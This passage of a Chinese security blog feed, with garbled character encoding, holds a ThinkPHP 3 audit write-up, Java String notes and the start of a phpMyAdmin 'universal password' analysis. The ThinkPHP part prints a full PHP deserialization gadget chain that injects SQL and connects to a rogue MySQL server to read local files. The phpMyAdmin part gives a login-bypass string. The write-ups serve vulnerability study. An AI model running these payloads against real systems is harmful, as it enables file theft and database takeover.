class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;db = <span class="keyword">new</span> \Think\Db\Driver\Mysql();</span><br><span class="line"><span class="comment">//$this-&gt;pk çš„å€¼éœ€è¦å’Œ $this-&gt;data å…¶ä¸­ä¸€ä¸ª keyå€¼ ä¸€è‡´</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;pk = <span class="string">&#x27;x&#x27;</span>;</span><br><span class="line"><span class="comment">//$this-&gt;data å†…å®¹éšæ„ï¼Œåªæ˜¯è¿‡ä¸€ä¸ª if</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;data = [</span><br><span class="line"><span class="string">&#x27;x&#x27;</span> =&gt; [</span><br><span class="line"><span class="string">&#x27;a&#x27;</span> =&gt; <span class="number">111</span>,</span><br><span class="line">]</span><br><span class="line">];</span><br><span class="line"><span class="keyword">$this</span>-&gt;options = [</span><br><span class="line"><span class="comment">//å†…å®¹éšæ„ï¼Œä¹Ÿåªæ˜¯è¿‡ä¸€ä¸ª if</span></span><br><span class="line"><span class="string">&#x27;where&#x27;</span> =&gt; <span class="number">1</span>,</span><br><span class="line"><span class="comment">//$sql   = &#x27;DELETE FROM &#x27; . $table;</span></span><br><span class="line"><span class="comment">//SQL æ³¨å…¥è¯­å¥</span></span><br><span class="line">                <span class="comment">//!!!æ³¨æ„!!!</span></span><br><span class="line">                <span class="comment">//DELETE æ˜¯é«˜é£é™©æ“ä½œï¼Œå°å¿ƒè°¨æ…</span></span><br><span class="line"><span class="string">&#x27;table&#x27;</span> =&gt; <span class="string">&#x27;mysql.user where 1=2 #&#x27;</span></span><br><span class="line">];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//(1) ç¬¬ä¸€ä¸ªè·³æ¿ Memcache-&gt;destroy()</span></span><br><span class="line"><span class="comment">//(2) åœ¨è¿™ä¸ªæ–¹æ³•ä¸­åˆè°ƒç”¨äº† $this-&gt;handle-&gt;delete($this-&gt;sessionName . $sessID);</span></span><br><span class="line"><span class="comment">//(3) sessionName å¿…é¡»ä¸ºç©ºï¼Œå¦‚æœä¸ºå­—ç¬¦ä¸²ä¼ å…¥çš„è¯ï¼Œç”±äº $sessID æ²¡æœ‰èµ‹å€¼</span></span><br><span class="line"><span class="comment">//æœ€ç»ˆè°ƒç”¨ $this-&gt;handle-&gt;delete()æ—¶å°†ä¼šä¼ å…¥éé¢„æœŸå€¼</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>\<span class="title">Session</span>\<span class="title">Driver</span>&#123;</span><br><span class="line"><span class="title">class</span> <span class="title">Memcache</span>&#123;</span><br><span class="line"><span class="title">protected</span> $<span class="title">handle</span> = <span class="title">null</span>;</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$sessionName</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;handle = <span class="keyword">new</span> \Think\Model();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//æ¢¦å¼€å§‹çš„åœ°æ–¹</span></span><br><span class="line"><span class="comment">//è°ƒç”¨åœ°ä¸€ä¸ªè·³æ¿ Memcache-&gt;destroy()</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>\<span class="title">Image</span>\<span class="title">Driver</span>&#123;</span><br><span class="line"><span class="title">class</span> <span class="title">Imagick</span>&#123;</span><br><span class="line"><span class="title">private</span> $<span class="title">img</span> = <span class="title">null</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;img = <span class="keyword">new</span> \Think\Session\Driver\Memcache();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">$<span class="title">a</span> = <span class="title">new</span> \<span class="title">Think</span>\<span class="title">Image</span>\<span class="title">Driver</span>\<span class="title">Imagick</span>();</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="variable">$a</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br><p>å¼€å¯ Debug ï¼Œè¿½è¸ªç¨‹åºæ‰§è¡Œæµç¨‹ï¼Œå‘ç° SQL è¯­å¥æˆåŠŸè¢«æ§åˆ¶</p><img src="/2021/03/01/2021-02-28-tp3-x-sql/2.png" style="width:500px;"><br><p>ä½†æ˜¯ï¼Œç”±äºæˆ‘ä»¬æ— æ³•çŸ¥é“ç›®æ ‡æœåŠ¡å™¨çš„ Mysql é…ç½®ï¼Œæ‰€ä»¥ SQLæ³¨å…¥è‡ªç„¶æ˜¯è·‘ä¸åŠ¨çš„ã€‚</p><p>ä»”ç»†æŸ¥çœ‹æ•°æ®åº“è¿æ¥å‡½æ•° <code>connect</code> åï¼Œå‘ç°å…¶ PDO é…ç½®æ˜¯æˆ‘ä»¬å¯æ§çš„</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;linkID[<span class="variable">$linkNum</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$config</span>)) &#123;</span><br><span class="line">        <span class="variable">$config</span> = <span class="keyword">$this</span>-&gt;config;</span><br><span class="line">    &#125;</span><br><span class="line">......</span><br><span class="line"><span class="keyword">$this</span>-&gt;linkID[<span class="variable">$linkNum</span>] = <span class="keyword">new</span> PDO(<span class="variable">$config</span>[<span class="string">&#x27;dsn&#x27;</span>], <span class="variable">$config</span>[<span class="string">&#x27;username&#x27;</span>], <span class="variable">$config</span>[<span class="string">&#x27;password&#x27;</span>], <span class="keyword">$this</span>-&gt;options);</span><br><span class="line">......</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;linkID[<span class="variable">$linkNum</span>];</span><br></pre></td></tr></table></figure><br><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ§åˆ¶ tp3 è¿æ¥çš„æ•°æ®åº“ï¼Œè‡ªç„¶æƒ³åˆ°äº† Rogue mysql server</p><p><strong>åŸç†ç®€å•æ¥è¯´æ˜¯è¿™æ ·çš„ï¼š</strong></p><p>mysqlä¸­æœ‰ä¸€ä¸ª SQLè¯­å¥ï¼Œä¸º LOAD DATA LOCAL INFILEã€‚ä½œç”¨æ˜¯å°†å®¢æˆ·ç«¯æœ¬åœ°çš„æ–‡ä»¶åŠ è½½åˆ°æ•°æ®åº“ä¸­ã€‚è€Œ Rogue mysql server å¯ä»¥ä»»æ„è¯»å– mysql å®¢æˆ·ç«¯çš„æœ¬åœ°æ–‡ä»¶ã€‚</p><p>å…·ä½“è¯¦æƒ…å¯è§æœ¬åšå®¢çš„å¦ä¸€ç¯‡æ–‡ç«  :)</p><a href="/2021/02/08/2021-02-08-mysql-load-data/" title="Rogue Mysql Server ç®€å•åˆ†æ">Rogue Mysql Server ç®€å•åˆ†æ</a><br><p>å°è¯•è®© tp3 è¿æ¥ Rogue  mysql serverã€‚ä¿®æ”¹ payloadï¼Œå¢åŠ æ•°æ®åº“é…ç½®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>\<span class="title">Db</span>\<span class="title">Driver</span>&#123;</span><br><span class="line"><span class="title">class</span> <span class="title">Mysql</span>&#123;</span><br><span class="line">        //æ–°å¢ <span class="title">mysql</span> é…ç½®</span><br><span class="line"><span class="title">protected</span> $<span class="title">config</span> = <span class="title">array</span>(</span><br><span class="line">        &#x27;type&#x27;           =&gt; &#x27;mysql&#x27;, // æ•°æ®åº“ç±»å‹</span><br><span class="line">        <span class="string">&#x27;hostname&#x27;</span>       =&gt; <span class="string">&#x27;192.168.92.164&#x27;</span>, <span class="comment">// æœåŠ¡å™¨åœ°å€</span></span><br><span class="line">        <span class="string">&#x27;username&#x27;</span>       =&gt; <span class="string">&#x27;root&#x27;</span>, <span class="comment">// ç”¨æˆ·å</span></span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>       =&gt; <span class="string">&#x27;123456&#x27;</span>, <span class="comment">// å¯†ç </span></span><br><span class="line">        <span class="string">&#x27;hostport&#x27;</span>       =&gt; <span class="string">&#x27;3333&#x27;</span>, <span class="comment">// ç«¯å£</span></span><br><span class="line">    );</span><br><span class="line">    <span class="comment">//è®¾ç½®è¿™ä¸ª PDO æ‰èƒ½ LOAD DATA LOCAL</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$options</span> = <span class="keyword">array</span>(</span><br><span class="line"><span class="comment">//éœ€è¦åœ¨å‰é¢åŠ ä¸€ä¸ª \ ã€‚ä¸ç„¶å°†ä¼šæŠ¥ PDO not found çš„é”™è¯¯</span></span><br><span class="line">        \PDO::MYSQL_ATTR_LOCAL_INFILE  =&gt; <span class="literal">true</span>,</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>&#123;</span><br><span class="line"><span class="title">class</span> <span class="title">Model</span>&#123;</span><br><span class="line">protected $pk = &#x27;exp&#x27;;</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$db</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$data</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$options</span>   = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;db = <span class="keyword">new</span> \Think\Db\Driver\Mysql();</span><br><span class="line"><span class="keyword">$this</span>-&gt;pk = <span class="string">&#x27;x&#x27;</span>;</span><br><span class="line"><span class="keyword">$this</span>-&gt;data = [</span><br><span class="line"><span class="string">&#x27;x&#x27;</span> =&gt; [</span><br><span class="line"><span class="string">&#x27;a&#x27;</span> =&gt; <span class="number">111</span>,</span><br><span class="line">]</span><br><span class="line">];</span><br><span class="line"><span class="keyword">$this</span>-&gt;options = [</span><br><span class="line"><span class="string">&#x27;where&#x27;</span> =&gt; <span class="number">1</span>,</span><br><span class="line">                <span class="comment">//!!!æ³¨æ„!!!</span></span><br><span class="line">                <span class="comment">//DELETE æ˜¯é«˜é£é™©æ“ä½œï¼Œå°å¿ƒè°¨æ…</span></span><br><span class="line"><span class="string">&#x27;table&#x27;</span> =&gt; <span class="string">&#x27;mysql.user where 1=2 #&#x27;</span></span><br><span class="line">];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>\<span class="title">Session</span>\<span class="title">Driver</span>&#123;</span><br><span class="line"><span class="title">class</span> <span class="title">Memcache</span>&#123;</span><br><span class="line"><span class="title">protected</span> $<span class="title">handle</span> = <span class="title">null</span>;</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$sessionName</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;handle = <span class="keyword">new</span> \Think\Model();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>\<span class="title">Image</span>\<span class="title">Driver</span>&#123;</span><br><span class="line"><span class="title">class</span> <span class="title">Imagick</span>&#123;</span><br><span class="line"><span class="title">private</span> $<span class="title">img</span> = <span class="title">null</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;img = <span class="keyword">new</span> \Think\Session\Driver\Memcache();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">$<span class="title">a</span> = <span class="title">new</span> \<span class="title">Think</span>\<span class="title">Image</span>\<span class="title">Driver</span>\<span class="title">Imagick</span>();</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="variable">$a</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br><p>æˆåŠŸè¯»å–å®¢æˆ·ç«¯æ–‡ä»¶</p><img src="/2021/03/01/2021-02-28-tp3-x-sql/3.png" style="width:500px;"><br><p>è‡ªæ­¤æ–‡ç« å°±å†™åˆ°è¿™äº†ï¼Œæœ¬æ¥äºŒæœˆåå¤šå·å¼€å§‹å†™çš„ï¼Œä¸­é—´åœåœå†™å†™ï¼Œæœ€åæ‹–åˆ°ç°åœ¨æ‰å…¨éƒ¨å†™å®Œã€‚ã€‚ã€‚</p><p><strong>è¯¥æ¼æ´è¿˜å¯ç»§ç»­åˆ©ç”¨ï¼Œé€šè¿‡ Rogue  Mysql Server è¯»å– tp3 çš„ æ•°æ®åº“é…ç½®ï¼Œå†åˆ©ç”¨è¯¥é…ç½®è¿›è¡Œ SQLæ³¨å…¥ã€‚å…·ä½“çš„ Reference ä¸­å†™äº†ï¼Œè†œæ‹œä¸‹å¥¶æƒå¸ˆå‚…</strong></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Referenceï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s/S3Un1EM-cftFXr8hxG4qfA&quot;&gt;https://mp.weixin.qq.com/s/S3Un1EM-cftFXr8hxG4qfA&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="codeAudit" scheme="http://example.com/categories/codeAudit/"/>
    
    <category term="thinkphp3" scheme="http://example.com/categories/codeAudit/thinkphp3/"/>
    
    
    <category term="codeAudit" scheme="http://example.com/tags/codeAudit/"/>
    
    <category term="PHP" scheme="http://example.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>Javaç¬”è®°(2) - Stringç›¸å…³</title>
    <link href="http://example.com/2021/03/01/2021-03-01-java-string/"/>
    <id>http://example.com/2021/03/01/2021-03-01-java-string/</id>
    <published>2021-03-01T05:50:25.000Z</published>
    <updated>2021-03-01T07:54:49.919Z</updated>
    
    <content type="html"><![CDATA[<p><strong>(1) å­—ç¬¦ä¸²çš„å†…å®¹æ°¸ä¸å¯æ”¹å˜</strong></p><p>&nbsp;&nbsp;&nbsp;å› ä¸ºåœ¨ Stringç±» ä¸­ï¼Œ value çš„ä¿®é¥°ç¬¦ä¸º final</p><p><strong>(2) æ‰€æœ‰åŒå¼•å·åŒ…èµ·æ¥çš„å­—ç¬¦ä¸²ï¼Œéƒ½æ˜¯ Stringç±» çš„å¯¹è±¡</strong></p><p><strong>(3) ç”±äº String ä¸å¯æ”¹å˜ï¼Œæ‰€ä»¥å­—ç¬¦ä¸²å¯å…±äº«ä½¿ç”¨</strong></p><span id="more"></span><br><p><strong>å­—ç¬¦ä¸²å¸¸é‡æ± ï¼š</strong></p><p>ç›´æ¥ç”¨åŒå¼•å·å†™çš„å­—ç¬¦ä¸²åœ¨å­—ç¬¦ä¸²å¸¸é‡æ± ä¸­</p><p>ä½†æ˜¯ç”¨ new String(byte[] / char[]) çš„å­—ç¬¦ä¸²ä¸åœ¨å­—ç¬¦ä¸²å¸¸é‡æ± ä¸­ã€‚æ˜¯æ–°å»ºçš„ä¸€ä¸ªå¯¹è±¡</p><br> <p><strong>å­—ç¬¦ä¸²æ¯”è¾ƒï¼š</strong></p><p>å¯¹äºåŸºæœ¬ç±»å‹æ¥è¯´ï¼Œ== æ¯”è¾ƒæ•°å€¼</p><p>å¯¹äºå¼•ç”¨ç±»å‹æ¥è¯´ï¼Œ== æ¯”è¾ƒåœ°å€</p><br><p><strong>Demo:</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">String x1 = <span class="string">&quot;abc&quot;</span>;</span><br><span class="line"><span class="keyword">char</span>[] c = &#123;<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>&#125;;</span><br><span class="line">String x2 = <span class="keyword">new</span> String(c);</span><br><span class="line">String x3 = <span class="string">&quot;ABC&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ç›´æ¥ä½¿ç”¨ == è¿›è¡Œå­—ç¬¦ä¸²æ¯”è¾ƒã€‚æ¯”è¾ƒçš„æ˜¯è¿™ä¸¤ä¸ªå¼•ç”¨ç±»å‹å˜é‡çš„åœ°å€å€¼</span></span><br><span class="line">System.out.println(x1==x2); <span class="comment">//è¾“å‡º false</span></span><br><span class="line"><span class="comment">//ä½¿ç”¨ Stringç±» çš„ equals æ–¹æ³•è¿›è¡Œå­—ç¬¦ä¸²æ¯”è¾ƒ</span></span><br><span class="line"><span class="comment">//ä½†æ˜¯è¿™ä¸ªæ–¹æ³•å®¹æ˜“æŠ¥ç©ºæŒ‡é’ˆå¼‚å¸¸</span></span><br><span class="line">System.out.println(x1.equals(x2)); <span class="comment">//è¾“å‡º true</span></span><br><span class="line"><span class="comment">//ä½¿ç”¨ Objectsç±» çš„ equals æ–¹æ³•è¿›è¡Œå­—ç¬¦ä¸²æ¯”è¾ƒ</span></span><br><span class="line"><span class="comment">//è¿™ä¸ªæ–¹æ³•ç©ºæŒ‡é’ˆå®‰å…¨</span></span><br><span class="line">System.out.println(Objects.equals(x1,x2)); <span class="comment">//è¾“å‡º true</span></span><br><span class="line"><span class="comment">//å¿½ç•¥å­—ç¬¦ä¸²å¤§å°å†™è¿›è¡Œæ¯”è¾ƒ</span></span><br><span class="line"><span class="comment">//å¦‚æœè¦ç”¨ Stringç±» ä¸‹çš„æ–¹æ³•ï¼Œå»ºè®®å°†å¸¸é‡æ”¾å·¦è¾¹ï¼Œæ¯”è¾ƒå˜é‡æ”¾å³è¾¹</span></span><br><span class="line">System.out.println(<span class="string">&quot;abc&quot;</span>.equalsIgnoreCase(x3)); <span class="comment">//è¾“å‡º true</span></span><br></pre></td></tr></table></figure><br><p><strong>å­—ç¬¦ä¸²æ‹¼æ¥</strong></p><p>ç”±äºåœ¨ Stringç±» ä¸­ï¼Œvalueçš„ä¿®é¥°ç¬¦æ˜¯ finalã€‚æ‰€ä»¥æ¯ä¸ªå­—ç¬¦ä¸²éƒ½åƒä¸ªå¸¸é‡ä¸å¯æ”¹å˜ã€‚</p><p>æ‰€ä»¥åœ¨ java ä¸­è¿›è¡Œå­—ç¬¦ä¸²æ‹¼æ¥ï¼Œå°¤å…¶æ˜¯å¤šä¸ªå­—ç¬¦ä¸²æ‹¼æ¥åœ¨ä¸€èµ·æ—¶ï¼Œå°±ä¼šäº§ç”Ÿæ•ˆç‡çš„é—®é¢˜:</p><br><p><strong>Demo:</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String x = <span class="string">&quot;a&quot;</span>+<span class="string">&quot;b&quot;</span>+<span class="string">&quot;c&quot;</span>;</span><br></pre></td></tr></table></figure><br><p>åœ¨è¿™ä¸€æ®µä»£ç ä¸­ï¼Œ Java çš„æ‰§è¡Œæµç¨‹ä¸º</p><ol><li>åœ¨å†…å­˜ä¸­å­˜æ”¾ä¸‰ä¸ªå­—ç¬¦ä¸²: a, b, c</li><li>æ‹¼æ¥ a å’Œ bã€‚åœ¨å†…å­˜ä¸­å­˜æ”¾æ–°å­—ç¬¦ä¸² ab</li><li>æ‹¼æ¥ ab å’Œ cã€‚åœ¨å†…å­˜ä¸­å­˜æ”¾æ–°å­—ç¬¦ä¸² abc</li></ol><br><p>è¿™æ ·å­çš„æ‹¼æ¥æ–¹å¼æ•ˆç‡å°±å¾ˆä½äº†ã€‚å¹¶ä¸”é€ æˆè®¸å¤šå†…å­˜ç©ºé—´çš„æµªè´¹</p><br><p>Javaä¸­æœ‰ä¸¤ä¸ªç±» StringBuilder å’Œ StringBuffer ï¼Œé¡¾åæ€ä¹‰ï¼Œå®ƒä»¬æ˜¯ä½œä¸ºå­—ç¬¦ä¸²æ“ä½œçš„ç¼“å†²ã€‚</p><p>å…¶ä¸­ StringBuilder æ˜¯éçº¿ç¨‹å®‰å…¨ã€‚StringBuffer æ˜¯çº¿ç¨‹å®‰å…¨çš„</p><br><p><strong>Demo:</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">StringBuilder x3 = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">x3.append(<span class="string">&quot;a&quot;</span>).append(<span class="string">&quot;b&quot;</span>).x3.append(<span class="string">&quot;c&quot;</span>);</span><br><span class="line">System.out.println(x3.toString()); <span class="comment">//è¾“å‡º abc</span></span><br></pre></td></tr></table></figure><br><p><strong>æ¯”è¾ƒä¸‹æ•ˆç‡:</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">String x1 = <span class="keyword">null</span>;</span><br><span class="line">StringBuilder x2 = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">StringBuffer x3 = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">System.out.println(x3.toString());</span><br><span class="line"></span><br><span class="line"><span class="keyword">long</span> start = System.currentTimeMillis();</span><br><span class="line"><span class="keyword">for</span> (Integer i=<span class="number">0</span>;i&lt;<span class="number">100000</span>;i++)&#123;</span><br><span class="line">    <span class="comment">//é€šè¿‡å¼€å…³æ³¨é‡Šæ¥æ¯”è¾ƒè¿è¡Œæ—¶é—´</span></span><br><span class="line">    x1 += i.toString();      <span class="comment">//è¿è¡Œæ—¶é—´ 2659æ¯«ç§’</span></span><br><span class="line"><span class="comment">//x2.append(i.toString()); //è¿è¡Œæ—¶é—´ 14æ¯«ç§’</span></span><br><span class="line"><span class="comment">//x3.append(i.toString()); //è¿è¡Œæ—¶é—´ 18æ¯«ç§’</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">long</span> end = System.currentTimeMillis();</span><br><span class="line">System.out.println(end-start);</span><br></pre></td></tr></table></figure><br><p><strong>å­—ç¬¦ä¸²è½¬æ¢</strong></p><br><p>åŸºæœ¬ç±»å‹ è½¬ å­—ç¬¦ä¸²ã€‚æœ€ç®€å•çš„æ–¹å¼:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">åŸºæœ¬ç±»å‹ + <span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure><br><p>å­—ç¬¦ä¸²è½¬åŸºæœ¬ç±»å‹:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Integer.parseInt(<span class="string">&quot;123&quot;</span>);</span><br><span class="line">Double.parseDouble(<span class="string">&quot;3.14&quot;</span>);</span><br><span class="line"><span class="comment">//å…¶ä»–ç±»å‹åŒç†å¯å¾—</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;strong&gt;(1) å­—ç¬¦ä¸²çš„å†…å®¹æ°¸ä¸å¯æ”¹å˜&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;å› ä¸ºåœ¨ Stringç±» ä¸­ï¼Œ value çš„ä¿®é¥°ç¬¦ä¸º final&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;(2) æ‰€æœ‰åŒå¼•å·åŒ…èµ·æ¥çš„å­—ç¬¦ä¸²ï¼Œéƒ½æ˜¯ Stringç±» çš„å¯¹è±¡&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;(3) ç”±äº String ä¸å¯æ”¹å˜ï¼Œæ‰€ä»¥å­—ç¬¦ä¸²å¯å…±äº«ä½¿ç”¨&lt;/strong&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="java" scheme="http://example.com/categories/java/"/>
    
    
    <category term="java" scheme="http://example.com/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>phpmyadmin ä¸‡èƒ½å¯†ç ç®€å•åˆ†æ</title>
    <link href="http://example.com/2021/02/27/2021-02-27-phpmyadmin-universalPassword/"/>
    <id>http://example.com/2021/02/27/2021-02-27-phpmyadmin-universalPassword/</id>
    <published>2021-02-27T15:12:27.000Z</published>
    <updated>2021-03-15T15:35:23.863Z</updated>
    
    <content type="html"><![CDATA[<br><p>ç½‘ä¸Šå¹¿ä¸ºæµç¨‹çš„ phpmyadmin ä¸‡èƒ½å¯†ç å¦‚ä¸‹:</p><br><blockquote><p>â€˜localhostâ€˜@â€˜@â€</p></blockquote><p>æ®è¯´ phpmyadmin ç‰ˆæœ¬ä¸º 2.11.3 å’Œ 2.11.4 éƒ½å¯ç”¨</p><br><p>ä½†æ˜¯è¿™ä¸ªæ¼æ´æ²¡æœ‰ CVEç¼–å·ï¼Œå›½å¤–ä¹Ÿæ²¡æœåˆ°å…³äºè¿™ä¸ªæ¼æ´çš„è¯¦æƒ…</p><span id="more"></span><br><h2 id="ç¯å¢ƒå‡†å¤‡"><a href="#ç¯å¢ƒå‡†å¤‡" class="headerlink" title="ç¯å¢ƒå‡†å¤‡"></a>ç¯å¢ƒå‡†å¤‡</h2><br><p><em>phpmyadmin</em> çš„å†å²ç‰ˆæœ¬å¯ä»¥åœ¨å…¶ <a href="https://github.com/phpmyadmin/phpmyadmin/releases?after=RELEASE_2_11_4">github</a> ä¸Šä¸‹è½½ã€‚æˆ‘è¿™é‡Œä½¿ç”¨çš„æ˜¯ phpmyadmin 2.11.3ï¼›php 5.6ï¼›mysql 5.7</p><br><p>ä¸‹è½½å¥½åè§£å‹ä¸¢åˆ° web ç›®å½•ï¼Œå…·ä½“æ“ä½œå¯ä»¥çœ‹åŒç›®å½•ä¸‹çš„ <em>Documentation.html</em> </p><br><p>å¦‚æœä¸æƒ³çœ‹æ–‡æ¡£å°±ç›´æ¥ copy ä¸€ä»½ <em>config.sample.inc.php</em> å‘½åä¸º <em>config.inc.php</em>ã€‚</p><p>ä¿®æ”¹ <code>$cfg[&#39;Servers&#39;][$i][&#39;auth_type&#39;]</code> å€¼ä¸º <code>cookie</code> å³å¯</p><br><h2 id="åˆæ¢ä¸‡èƒ½å¯†ç "><a href="#åˆæ¢ä¸‡èƒ½å¯†ç " 